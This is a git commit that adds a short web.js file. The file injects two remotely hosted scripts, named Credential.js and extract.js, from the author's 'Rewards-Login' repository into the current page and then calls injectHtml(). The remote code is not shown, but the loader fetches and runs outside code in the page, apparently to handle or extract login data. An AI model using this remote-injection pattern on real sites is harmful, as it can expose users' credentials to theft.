474136ed88e8d2af19f4e6b3f5dbf4c85b9f4eb4
legendsayantan <legendsayantanpaul@gmail.com>
2024-02-17 12:43:52 +0530

    added web.js

---
+++ web.js
@@ -0,0 +1,7 @@
+var e1 = document.createElement("script"); 
+e1.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/Credential.js"); 
+document.body.appendChild(e1);
+var e2 = document.createElement("script"); 
+e2.setAttribute("src", "https://cdn.jsdelivr.net/gh/legendsayantan/Rewards-Login@main/extract.js");
+document.body.appendChild(e2);
+injectHtml();
